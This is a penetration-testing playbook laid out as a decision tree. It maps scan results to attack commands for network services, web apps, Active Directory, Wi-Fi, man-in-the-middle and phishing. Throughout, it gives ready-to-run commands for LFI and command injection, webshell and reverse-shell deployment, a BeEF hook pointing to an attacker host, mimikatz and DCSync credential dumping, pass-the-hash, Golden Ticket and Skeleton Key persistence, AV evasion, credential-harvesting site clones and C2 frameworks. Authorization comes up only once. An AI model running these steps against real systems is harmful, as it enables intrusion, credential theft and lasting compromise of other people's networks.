# Pivot Map — "If X → Then Y" Decision Tree

> Core routing logic. Consult after every scan result.

---

## From: Initial Target (IP/hostname given)

```
TARGET RECEIVED
  ├─ Single IP     → nmap -sS -sV -sC -O -p- <target>
  ├─ Subnet/CIDR   → nmap -sn <range>  (discover live hosts first)
  ├─ Domain name   → whois + dig (ANY + axfr) + whatweb → then nmap
  ├─ URL given     → whatweb <url> → gobuster → nikto
  └─ WiFi target   → airmon-ng start → airodump-ng → SEE WIRELESS PIVOT
```

---

## From: Nmap Results

```
PORT FOUND
  ├─ 21/ftp
  │   ├─ Anonymous login?       → ftp <target> (user: anonymous)
  │   ├─ Version known?         → searchsploit <version>
  │   ├─ Writable?              → upload test file, possible shell
  │   └─ No anon, no exploit    → hydra/medusa ftp (last resort)
  │
  ├─ 22/ssh
  │   ├─ Version known?         → searchsploit (e.g. OpenSSH <7.7 user enum)
  │   ├─ Auth methods?          → ssh -v (password vs key-only)
  │   ├─ Creds found elsewhere? → try them here
  │   └─ Key found?             → ssh -i key <user>@<target>
  │
  ├─ 23/telnet
  │   └─ nc -nv <target> 23     → banner grab, often default creds
  │
  ├─ 25,465,587/smtp
  │   ├─ nc <target> 25         → HELO, VRFY <user>, EXPN
  │   ├─ VRFY enabled?          → enumerate users for brute lists
  │   ├─ Open relay?            → note for report
  │   └─ Version?               → searchsploit
  │
  ├─ 53/dns
  │   ├─ dig axfr @<target> <domain>  → zone transfer (jackpot)
  │   ├─ dig <domain> ANY @<target>   → all records
  │   └─ gobuster dns -d <domain>     → subdomain brute
  │
  ├─ 80,443/http(s)            → SEE WEB PIVOT BELOW
  │
  ├─ 110,143/pop3,imap
  │   ├─ Version?               → searchsploit
  │   └─ Creds found?           → login, read mail for more intel
  │
  ├─ 111/rpcbind
  │   ├─ rpcinfo -p <target>    → list RPC services
  │   └─ NFS found?             → showmount -e <target> → mount shares
  │
  ├─ 135,139,445/smb           → SEE SMB/AD PIVOT BELOW
  │
  ├─ 161/snmp (UDP)
  │   ├─ snmpwalk -v2c -c public <target>   → try "public" first
  │   ├─ snmpwalk -v2c -c private <target>  → try "private"
  │   └─ Info found?            → users, processes, interfaces, sometimes creds
  │
  ├─ 389,636/ldap
  │   ├─ ldapsearch -x -H ldap://<target> -b "" -s base
  │   ├─ Anonymous bind?        → enumerate users, groups, OUs
  │   └─ Domain info?           → feed to bloodhound, crackmapexec
  │
  ├─ 1433/mssql
  │   ├─ Default sa:sa?         → try
  │   ├─ crackmapexec mssql <target> -u sa -p <pass>
  │   ├─ xp_cmdshell?          → RCE if enabled
  │   └─ Version?              → searchsploit
  │
  ├─ 1521/oracle
  │   ├─ TNS listener version?  → searchsploit
  │   └─ Default SIDs           → odat or manual
  │
  ├─ 2049/nfs
  │   ├─ showmount -e <target>  → list exports
  │   ├─ mount -t nfs <target>:<share> /mnt
  │   └─ Check for sensitive files, SSH keys, configs
  │
  ├─ 3306/mysql
  │   ├─ mysql -h <target> -u root → try no password
  │   ├─ Version?               → searchsploit
  │   └─ Creds found?           → dump databases for more creds
  │
  ├─ 3389/rdp
  │   ├─ Note for cred reuse    → try every cred found
  │   ├─ ncrack rdp://<target>  → brute (slow, noisy)
  │   └─ BlueKeep?             → nmap --script rdp-vuln-ms12-020
  │
  ├─ 5432/postgres
  │   ├─ Default postgres:postgres?
  │   ├─ Version?               → searchsploit
  │   └─ COPY FROM/TO?         → file read/write → RCE path
  │
  ├─ 5900+/vnc
  │   ├─ No auth?               → vncviewer <target>
  │   └─ Auth required?         → hydra vnc, or search for password file
  │
  ├─ 5985,5986/winrm
  │   ├─ crackmapexec winrm <target> -u <user> -p <pass>
  │   └─ evil-winrm -i <target> -u <user> -p <pass>
  │
  ├─ 6379/redis
  │   ├─ redis-cli -h <target> info    → no auth?
  │   ├─ KEYS *                         → enumerate
  │   └─ CONFIG SET dir/dbfilename     → write webshell or SSH key
  │
  ├─ 8080,8443,8000,8888/alt-http → treat as web, same as 80/443
  │
  ├─ 9200/elasticsearch
  │   ├─ curl http://<target>:9200     → version, cluster info
  │   ├─ curl http://<target>:9200/_cat/indices  → list all indices
  │   └─ No auth default              → dump data
  │
  ├─ 11211/memcached
  │   └─ nc <target> 11211 → "stats items" → "stats cachedump"
  │
  ├─ 27017/mongodb
  │   ├─ mongo <target>                 → try no auth
  │   └─ show dbs → use <db> → show collections → db.<c>.find()
  │
  └─ UNKNOWN PORT
      ├─ nc -nv -w 3 <target> <port>   → banner grab
      ├─ nmap -sV -sC -p <port> <target>
      └─ Google banner string + port number
```

---

## From: Web Discovery (80/443/alt-http)

```
WEB FOUND
  │
  ├─ STEP 1: FINGERPRINT
  │   ├─ whatweb <url>                → tech stack, CMS, versions
  │   ├─ curl -sI <url>              → server headers
  │   └─ cewl <url> -d 2 -m 5 -w cewl_words.txt  → contextual wordlist
  │
  ├─ STEP 2: MANUAL CHECKS (curl or browser)
  │   ├─ /robots.txt                  → hidden paths
  │   ├─ /sitemap.xml                 → structure map
  │   ├─ /.git/HEAD                   → source code leak
  │   ├─ /.env                        → secrets
  │   ├─ /server-status               → Apache info leak
  │   ├─ /server-info                 → Apache module list
  │   ├─ /wp-login.php                → WordPress
  │   ├─ /administrator/              → Joomla
  │   ├─ /user/login                  → Drupal
  │   └─ /admin/                      → generic panel
  │
  ├─ STEP 3: DIRECTORY ENUM
  │   ├─ gobuster dir -u <url> -w <wordlist> -x <ext>
  │   │   ├─ Found /api/              → wfuzz params, test auth
  │   │   ├─ Found /backup/           → download everything
  │   │   ├─ Found /uploads/          → file upload test
  │   │   ├─ Found /phpmyadmin/       → default creds (root:<empty>)
  │   │   ├─ Found /cgi-bin/          → test shellshock
  │   │   ├─ Found /config/           → download, search creds
  │   │   ├─ Found /.git/             → git-dumper → source code
  │   │   ├─ Found 403 dirs           → SEE 403 BYPASS BELOW
  │   │   └─ Found login page         → SEE AUTH PIVOT BELOW
  │   │
  │   └─ If gobuster not enough:
  │       ├─ dirb <url> (recursive by default)
  │       ├─ wfuzz -w <list> --hc 404 <url>/FUZZ
  │       └─ wfuzz -H "Host: FUZZ.<domain>" (vhost discovery)
  │
  ├─ STEP 4: VULN SCANNING
  │   ├─ nikto -h <url>               → known vulns, misconfigs
  │   └─ owasp_zap quick-scan <url>   → automated DAST
  │
  ├─ STEP 5: CMS-SPECIFIC
  │   ├─ WordPress detected?
  │   │   ├─ wpscan --url <url> -e ap,at,u    → plugins, themes, users
  │   │   ├─ wpscan --url <url> -e vp,vt      → vuln plugins/themes
  │   │   ├─ /wp-json/wp/v2/users              → user enum (no auth)
  │   │   ├─ Version found?                    → searchsploit wordpress <ver>
  │   │   ├─ Vuln plugin found?                → searchsploit <plugin> <ver>
  │   │   └─ Users found?                      → wpscan brute or hydra
  │   │
  │   ├─ Joomla detected?
  │   │   ├─ joomscan -u <url>                 → full enum
  │   │   ├─ /administrator/                    → admin login
  │   │   ├─ Version?                           → searchsploit joomla <ver>
  │   │   └─ Components?                        → searchsploit per component
  │   │
  │   ├─ Drupal detected?
  │   │   ├─ droopescan scan drupal -u <url>
  │   │   ├─ /CHANGELOG.txt                     → exact version
  │   │   ├─ Drupalgeddon?                      → searchsploit drupal
  │   │   └─ Modules?                           → searchsploit per module
  │   │
  │   └─ Unknown CMS?
  │       ├─ droopescan scan -u <url>           → auto-detect
  │       └─ Deeper gobuster + manual testing
  │
  ├─ STEP 6: PARAMETER TESTING
  │   ├─ URL has params? (?id=, ?page=, ?file=, ?search=)
  │   │   ├─ SQLi test       → sqlmap -u "<url>?param=1" --batch
  │   │   ├─ LFI test        → curl "<url>?file=../../../etc/passwd"
  │   │   ├─ XSS test        → reflect check via curl
  │   │   └─ Command injection → curl "<url>?cmd=;id"
  │   │
  │   └─ No visible params?
  │       ├─ wfuzz -w <params_list> <url>?FUZZ=test   → discover params
  │       └─ Check POST forms (view source, inspect)
  │
  └─ STEP 7: ADVANCED WEB
      ├─ API found?
      │   ├─ wfuzz endpoints + methods
      │   ├─ Check auth (Bearer tokens, API keys)
      │   ├─ Test IDOR on resource IDs
      │   └─ Test mass assignment (extra POST params)
      │
      ├─ XSS confirmed?
      │   ├─ Stored XSS?     → beef hook injection
      │   └─ Reflected XSS?  → phishing payload via setoolkit
      │
      └─ File upload found?
          ├─ msfvenom -p php/reverse_php → generate shell
          ├─ Try direct upload .php
          ├─ Bypass: extension, content-type, magic bytes
          └─ Find upload path → trigger shell
```

---

## From: 403 Forbidden Bypass

```
403 ON INTERESTING PATH
  ├─ Path tricks
  │   ├─ /admin → /admin/ → /Admin → /ADMIN → /admin.php
  │   ├─ /admin → /./admin → //admin → /admin..;/
  │   └─ /admin → /%61dmin → /%2561dmin
  │
  ├─ Header tricks
  │   ├─ X-Forwarded-For: 127.0.0.1
  │   ├─ X-Original-URL: /admin
  │   ├─ X-Rewrite-URL: /admin
  │   └─ X-Custom-IP-Authorization: 127.0.0.1
  │
  ├─ Method tricks
  │   ├─ GET → POST → PUT → PATCH → OPTIONS
  │   └─ curl -X OPTIONS -I <url>   → check allowed methods
  │
  └─ Port/host tricks
      ├─ Same path on different HTTP port (80 vs 8080)
      └─ Different Host header value
```

---

## From: SMB/AD Discovery (135/139/445)

```
SMB FOUND
  │
  ├─ STEP 1: ENUMERATE
  │   ├─ enum4linux -a <target>            → full auto enum
  │   ├─ smbmap -H <target>                → share permissions map
  │   ├─ smbclient -L //<target> -N        → list shares (null session)
  │   ├─ rpcclient -U '' -N <target>       → RPC enum (enumdomusers, etc.)
  │   └─ crackmapexec smb <target>         → version, signing, domain
  │
  ├─ STEP 2: ACCESS SHARES
  │   ├─ smbclient //<target>/<share> -N   → null session access
  │   ├─ smbmap -R <share> -H <target>     → recursive file listing
  │   ├─ Download everything readable      → search for creds, keys, configs
  │   └─ Writable share?                   → possible shell upload vector
  │
  ├─ STEP 3: CHECK VULNS
  │   ├─ nmap --script smb-vuln* -p 445 <target>
  │   │   ├─ MS17-010 (EternalBlue)?       → msf exploit/windows/smb/ms17_010_eternalblue
  │   │   ├─ MS08-067?                      → msf exploit/windows/smb/ms08_067_netapi
  │   │   └─ PrintNightmare?                → msf or manual
  │   │
  │   └─ searchsploit <smb_version>
  │
  ├─ STEP 4: WITH CREDS (when obtained)
  │   ├─ crackmapexec smb <range> -u <user> -p <pass>    → spray network
  │   ├─ crackmapexec smb <target> -u <user> -p <pass> --shares
  │   ├─ crackmapexec smb <target> -u <user> -p <pass> --sam
  │   ├─ smbmap -H <target> -u <user> -p <pass>          → new permissions?
  │   └─ "Pwn3d!" in CME output?  → local admin → SEE LATERAL MOVEMENT
  │
  └─ STEP 5: AD ENVIRONMENT?
      ├─ bloodhound collection             → map attack paths
      ├─ crackmapexec smb <range> --users  → domain user enum
      ├─ ldapsearch for domain info
      └─ → SEE AD ATTACK PIVOT BELOW
```

---

## From: Active Directory Attack Path

```
AD ENVIRONMENT CONFIRMED (domain creds obtained)
  │
  ├─ STEP 1: MAP THE DOMAIN
  │   ├─ bloodhound-python -u <user> -p <pass> -d <domain> -c all
  │   ├─ crackmapexec smb <dc_ip> --users           → all domain users
  │   ├─ crackmapexec smb <dc_ip> --groups           → all groups
  │   ├─ ldapsearch full dump                         → raw data
  │   └─ powersploit: Get-DomainUser, Get-DomainGroup (if PS access)
  │
  ├─ STEP 2: FIND QUICK WINS
  │   ├─ crackmapexec smb <range> -u <user> -p <pass> → local admin anywhere?
  │   ├─ crackmapexec smb <range> --pass-pol           → lockout policy
  │   ├─ Password spray: crackmapexec smb <range> -u users.txt -p 'Season2024!'
  │   ├─ Kerberoast → GetUserSPNs.py → hashcat -m 13100
  │   ├─ ASREProast → GetNPUsers.py → hashcat -m 18200
  │   └─ GPP passwords → Get-GPPPassword (PowerSploit)
  │
  ├─ STEP 3: LATERAL MOVEMENT
  │   ├─ psexec.py <domain>/<user>:<pass>@<target>     → SYSTEM shell (SMB)
  │   ├─ wmiexec.py <domain>/<user>:<pass>@<target>    → stealthier
  │   ├─ smbexec.py <domain>/<user>:<pass>@<target>    → no disk write
  │   ├─ evil-winrm -i <target> -u <user> -p <pass>    → PowerShell (5985)
  │   ├─ Pass-the-Hash:
  │   │   ├─ psexec.py -hashes :<ntlm> <domain>/<user>@<target>
  │   │   ├─ crackmapexec smb <range> -u <user> -H <hash>
  │   │   └─ pth-toolkit for legacy tools
  │   └─ Pass-the-Ticket:
  │       └─ mimikatz → export → inject ticket
  │
  ├─ STEP 4: CREDENTIAL HARVESTING
  │   ├─ secretsdump.py <domain>/<user>:<pass>@<target>  → SAM + LSA + NTDS
  │   ├─ mimikatz sekurlsa::logonpasswords                → memory creds
  │   ├─ mimikatz lsadump::sam                            → local SAM
  │   ├─ crackmapexec smb <target> --sam                  → remote SAM dump
  │   ├─ crackmapexec smb <target> --lsa                  → LSA secrets
  │   └─ responder -I <interface>                          → NTLM hash capture
  │
  ├─ STEP 5: DOMAIN ADMIN PATH
  │   ├─ BloodHound: "Shortest Path to Domain Admin"
  │   ├─ DCSync: secretsdump.py on DC → all hashes (needs DA or repl rights)
  │   ├─ mimikatz lsadump::dcsync /user:krbtgt
  │   └─ Golden Ticket: mimikatz kerberos::golden → persistent DA
  │
  └─ STEP 6: PERSISTENCE (if in scope)
      ├─ Golden Ticket (krbtgt hash)
      ├─ Silver Ticket (service account hash)
      ├─ Skeleton Key (mimikatz misc::skeleton)
      └─ empire / cobaltstrike for C2 persistence
```

---

## From: Credentials Found

```
CREDS FOUND (password or hash)
  │
  ├─ PASSWORD FOUND:
  │   ├─ SSH open?     → ssh <user>@<target>
  │   ├─ FTP open?     → ftp login
  │   ├─ SMB open?     → smbclient //<target>/<share> -U <user>%<pass>
  │   ├─ WinRM open?   → evil-winrm -i <target> -u <user> -p <pass>
  │   ├─ RDP open?     → rdesktop/xfreerdp
  │   ├─ Web login?    → try on all login forms
  │   ├─ DB port open? → mysql/psql/mssql login
  │   ├─ AD env?       → crackmapexec smb <range> -u <user> -p <pass>
  │   └─ ALWAYS        → try on ALL open services (reuse)
  │
  ├─ NTLM HASH FOUND:
  │   ├─ hashcat -m 1000 <hash> <wordlist>  → try crack (fast)
  │   ├─ Pass-the-Hash:
  │   │   ├─ psexec.py -hashes :<hash> → shell
  │   │   ├─ crackmapexec smb <range> -u <user> -H <hash> → spray
  │   │   ├─ evil-winrm -i <target> -u <user> -H <hash>
  │   │   └─ smbclient //<target>/<share> --pw-nt-hash
  │   └─ Don't waste time cracking if PTH works
  │
  ├─ NTLMv2 HASH (responder capture):
  │   ├─ hashcat -m 5600 <hash> <wordlist>   → crack (can't PTH with v2)
  │   ├─ NTLM relay instead?                  → impacket ntlmrelayx.py
  │   └─ Must crack — NTLMv2 is not passable
  │
  ├─ OTHER HASH FOUND:
  │   ├─ Identify type                → see interpretation/auth.md
  │   ├─ Fast hash (MD5/SHA1/NTLM)?  → hashcat, crack in seconds
  │   ├─ Slow hash (bcrypt/scrypt)?   → targeted wordlist, john with rules
  │   └─ Linux shadow ($6$)?          → john --wordlist=<list> unshadowed.txt
  │
  ├─ SSH KEY FOUND:
  │   ├─ ssh -i <key> <user>@<target>
  │   ├─ Passphrase required?         → ssh2john → john → crack
  │   └─ Try on all SSH-open hosts
  │
  └─ DB CREDS FOUND:
      ├─ Connect → dump users table → more creds
      ├─ Check for file read/write privileges
      ├─ MSSQL: xp_cmdshell → RCE
      ├─ MySQL: INTO OUTFILE → write webshell
      └─ PostgreSQL: COPY TO → file write
```

---

## From: Exploit Found (searchsploit / msf search)

```
EXPLOIT MATCH
  │
  ├─ ASSESS CONFIDENCE:
  │   ├─ Exact version match + Metasploit?   → HIGH, use MSF module
  │   ├─ Exact version match + Python/Ruby?  → HIGH, review code → run
  │   ├─ Close version match?                 → MEDIUM, may need tweaking
  │   ├─ Generic/old exploit?                 → LOW, likely patched
  │   └─ Multiple exploits available?         → prefer: RCE > auth bypass > LFI > SQLi > XSS
  │
  ├─ METASPLOIT MODULE EXISTS?
  │   ├─ msf> use <module>
  │   ├─ msf> show options → set RHOSTS, LHOST, LPORT
  │   ├─ msf> check                   → verify before exploit (if available)
  │   └─ msf> exploit
  │
  ├─ STANDALONE EXPLOIT?
  │   ├─ searchsploit -m <path>        → copy to working dir
  │   ├─ Read the code first           → understand it, check for backdoors
  │   ├─ Modify target/payload if needed
  │   └─ Setup listener: nc -lvnp <port> (or msf multi/handler)
  │
  ├─ NEED PAYLOAD?
  │   ├─ msfvenom for target OS + architecture
  │   ├─ Staged payload → needs MSF handler
  │   ├─ Stageless payload → works with nc listener
  │   ├─ AV detected? → veil or shellter for evasion
  │   └─ → See tools/metasploit.md payload selection logic
  │
  └─ EXPLOIT FAILED?
      ├─ Verify exact version again
      ├─ Check LHOST reachable from target
      ├─ Try different payload format
      ├─ Try manual exploit instead of automated
      └─ Move to next attack vector — don't brute-force a dead end
```

---

## From: Shell Obtained (Initial Access)

```
SHELL ON TARGET
  │
  ├─ STEP 1: STABILIZE
  │   ├─ python3 -c 'import pty;pty.spawn("/bin/bash")'
  │   ├─ Ctrl+Z → stty raw -echo; fg
  │   ├─ export TERM=xterm
  │   └─ If meterpreter: already stable
  │
  ├─ STEP 2: SITUATIONAL AWARENESS
  │   ├─ whoami / id                 → user, groups
  │   ├─ hostname                    → where are we?
  │   ├─ uname -a                    → kernel (Linux privesc)
  │   ├─ cat /etc/os-release         → distro
  │   ├─ systeminfo                  → Windows version
  │   ├─ ip a / ifconfig             → interfaces (dual-homed?)
  │   ├─ netstat -tlnp / ss -tlnp   → internal services
  │   ├─ env                         → environment vars (creds?)
  │   └─ cat /etc/passwd             → local users
  │
  ├─ STEP 3: PRIVILEGE ESCALATION (Linux)
  │   ├─ sudo -l                     → sudo permissions
  │   │   └─ GTFOBins check for any allowed binary
  │   ├─ find / -perm -4000 2>/dev/null → SUID binaries
  │   │   └─ GTFOBins check for each
  │   ├─ cat /etc/crontab; ls /etc/cron.*   → cron jobs (writable?)
  │   ├─ ls -la /home/*/             → other users' files
  │   ├─ Kernel version?             → searchsploit linux kernel <ver>
  │   ├─ find / -writable 2>/dev/null → writable files/dirs
  │   └─ Capabilities: getcap -r / 2>/dev/null
  │
  ├─ STEP 3: PRIVILEGE ESCALATION (Windows)
  │   ├─ whoami /priv                → check SeImpersonate, SeDebug, etc.
  │   │   ├─ SeImpersonatePrivilege  → Potato attacks (JuicyPotato, PrintSpoofer)
  │   │   └─ SeDebugPrivilege       → mimikatz
  │   ├─ systeminfo → searchsploit for kernel exploits
  │   ├─ powersploit: PowerUp.ps1   → auto-check misconfigs
  │   ├─ Unquoted service paths?    → hijack
  │   ├─ Writable service binaries? → replace
  │   ├─ AlwaysInstallElevated?     → msfvenom MSI payload
  │   └─ Stored credentials: cmdkey /list → runas /savecred
  │
  ├─ STEP 4: LOOT
  │   ├─ Search for creds: grep -ri "password\|passwd\|pwd\|secret\|api_key" /
  │   ├─ Config files: find / -name "*.conf" -o -name "*.config" -o -name ".env"
  │   ├─ SSH keys: find / -name "id_rsa" -o -name "*.pem" 2>/dev/null
  │   ├─ History: cat ~/.bash_history ~/.mysql_history
  │   ├─ Database files: find / -name "*.db" -o -name "*.sqlite" 2>/dev/null
  │   └─ Windows: reg query HKLM /s /f password
  │
  └─ STEP 5: PIVOT
      ├─ Dual-homed? (multiple interfaces)
      │   ├─ New subnet found → nmap scan from this host
      │   ├─ MSF: route add <subnet> <session_id>
      │   └─ SSH tunnel: ssh -D 9050 → proxychains
      │
      ├─ Domain joined? (Windows)
      │   └─ → SEE AD ATTACK PIVOT ABOVE
      │
      └─ Internal services? (127.0.0.1 only)
          ├─ Port forward: ssh -L <local>:127.0.0.1:<remote> <target>
          └─ chisel / socat for non-SSH tunneling
```

---

## From: Network Position (Internal / MITM)

```
ON INTERNAL NETWORK
  │
  ├─ PASSIVE FIRST:
  │   ├─ responder -I <iface> -A       → analyze mode (listen only)
  │   ├─ tcpdump / wireshark           → capture traffic
  │   └─ Identify: protocols, hosts, services, creds in cleartext
  │
  ├─ ACTIVE MITM:
  │   ├─ responder -I <iface>          → LLMNR/NBT-NS poisoning → NTLMv2 hashes
  │   ├─ bettercap:
  │   │   ├─ arp.spoof → intercept traffic
  │   │   ├─ net.sniff → capture creds
  │   │   ├─ dns.spoof → redirect traffic
  │   │   └─ http.proxy + sslstrip → downgrade HTTPS
  │   ├─ ettercap -T -M arp:remote     → ARP MITM
  │   └─ mitmproxy                      → inspect/modify HTTP(S)
  │
  ├─ HASH CAPTURED (from responder/MITM)?
  │   ├─ NTLMv2 → hashcat -m 5600 → crack
  │   ├─ NTLMv1 → hashcat -m 5500 → crack (easier)
  │   ├─ Can't crack? → ntlmrelayx.py → relay to other services
  │   └─ Cleartext cred? → try on all services immediately
  │
  └─ PIVOT FROM MITM:
      ├─ Creds captured → crackmapexec spray
      ├─ DNS spoofed → serve exploit page (beef hook, SET clone)
      └─ Internal hosts discovered → nmap targeted scan
```

---

## From: Wireless Access (WiFi)

```
WIRELESS ASSESSMENT
  │
  ├─ STEP 1: MONITOR MODE
  │   └─ airmon-ng start <iface>
  │
  ├─ STEP 2: DISCOVER NETWORKS
  │   └─ airodump-ng <mon_iface>
  │
  ├─ STEP 3: TARGET SELECTION
  │   ├─ WEP found?     → always crackable (aircrack-ng, auto-collect IVs)
  │   ├─ WPA/WPA2?      → need handshake
  │   │   ├─ airodump-ng -c <ch> --bssid <bssid> -w cap <iface>
  │   │   ├─ aireplay-ng -0 5 -a <bssid> <iface>  → deauth → force handshake
  │   │   ├─ aircrack-ng -w <wordlist> cap.cap      → dictionary crack
  │   │   └─ If wordlist fails → hashcat -m 22000 (hccapx, GPU)
  │   ├─ WPS enabled?   → wash -i <iface> → check lock status
  │   │   ├─ Not locked  → reaver -i <iface> -b <bssid> -vv
  │   │   └─ Locked?     → try bully, or wait/retry later
  │   └─ Enterprise?    → evil twin / certificate attack (advanced)
  │
  ├─ AUTOMATED OPTION:
  │   └─ wifite --kill    → handles everything auto
  │
  └─ AFTER WIFI PASSWORD OBTAINED:
      ├─ Connect to network
      ├─ nmap -sn <gateway_subnet>  → discover internal hosts
      ├─ responder on WiFi interface → capture hashes
      └─ Full internal pentest begins → BACK TO TOP
```

---

## From: Wordlist Needed

```
NEED WORDLIST FOR ATTACK
  │
  ├─ WEB TARGET EXISTS?
  │   └─ cewl <url> -d 3 -m 5 --with-numbers -w custom.txt   → contextual words
  │
  ├─ KNOW PASSWORD PATTERN?
  │   └─ crunch <min> <max> -t <pattern> -o pattern.txt       → targeted generation
  │       ├─ Company%%    → Company00-Company99
  │       ├─ @@@@%%%%     → 4 letters + 4 digits
  │       └─ ,@@@@@%%.    → Uppercase + 5 lower + 2 digits + symbol
  │
  ├─ COMBINE:
  │   ├─ cat cewl.txt crunch.txt > targeted.txt
  │   └─ Use with hashcat rules (best64.rule) → multiply effectiveness
  │
  └─ FALLBACK ORDER:
      ├─ 1. targeted.txt (custom)
      ├─ 2. /usr/share/seclists/Passwords/Common-Credentials/top-1000.txt
      ├─ 3. /usr/share/wordlists/rockyou.txt (top 10k lines)
      ├─ 4. Full rockyou.txt (14M — slow)
      └─ 5. crunch full brute (ONLY for short passwords / PINs)
```

---

## From: Social Engineering / Client-Side

```
CLIENT-SIDE ATTACK NEEDED
  │
  ├─ CREDENTIAL HARVESTING:
  │   ├─ setoolkit → Website Attack → Credential Harvester → Site Cloner
  │   └─ Clone target login → send link → capture creds
  │
  ├─ XSS EXPLOITATION:
  │   ├─ Stored XSS? → inject BeEF hook: <script src="http://<ip>:3000/hook.js">
  │   ├─ BeEF panel → browser commands, keylogging, redirect
  │   └─ Redirect to exploit page
  │
  ├─ PAYLOAD DELIVERY:
  │   ├─ msfvenom → generate for target OS
  │   ├─ AV blocking? → veil or shellter for evasion
  │   ├─ Need executable wrapper? → shellter inject into legit PE
  │   └─ Fileless? → PowerShell encoded payload (empire stager)
  │
  └─ C2 DEPLOYMENT (persistent access):
      ├─ empire → PS/Python agent, flexible comms
      ├─ cobaltstrike → Beacon (HTTP/DNS/SMB), team operations
      └─ metasploit → meterpreter persistence modules
```

---

## Master Decision: What Tool When?

```
PHASE → PRIMARY TOOLS → SUPPORT TOOLS

PASSIVE RECON:
  whois, dig, cewl                          searchsploit (prep)

ACTIVE RECON:
  nmap                                      netcat (banner grab)

WEB ENUM:
  whatweb → gobuster/dirb/wfuzz → nikto     curl (manual), owasp_zap

CMS SPECIFIC:
  wpscan / joomscan / droopescan            searchsploit

SMB/AD ENUM:
  enum4linux, smbmap, smbclient             rpcclient, crackmapexec, bloodhound

VULN IDENTIFICATION:
  searchsploit, nikto, nmap --script        owasp_zap, burpsuite

EXPLOITATION:
  sqlmap, metasploit (msf_console)          msfvenom (payloads), netcat (listener)

CREDENTIAL ATTACK:
  hydra (default), medusa/ncrack (alt)      hashcat/john (hashes), crunch/cewl (lists)

LATERAL MOVEMENT:
  crackmapexec, psexec, wmiexec, evil-winrm secretsdump, mimikatz, pth_tools

MITM/NETWORK:
  responder, bettercap                      ettercap, mitmproxy

WIRELESS:
  aircrack-ng suite, wifite                 reaver/bully (WPS)

CLIENT-SIDE:
  setoolkit, beef                           empire, cobaltstrike, veil, shellter

EVASION:
  veil, shellter, msfvenom encoders         empire (fileless), powersploit (AMSI bypass)
```
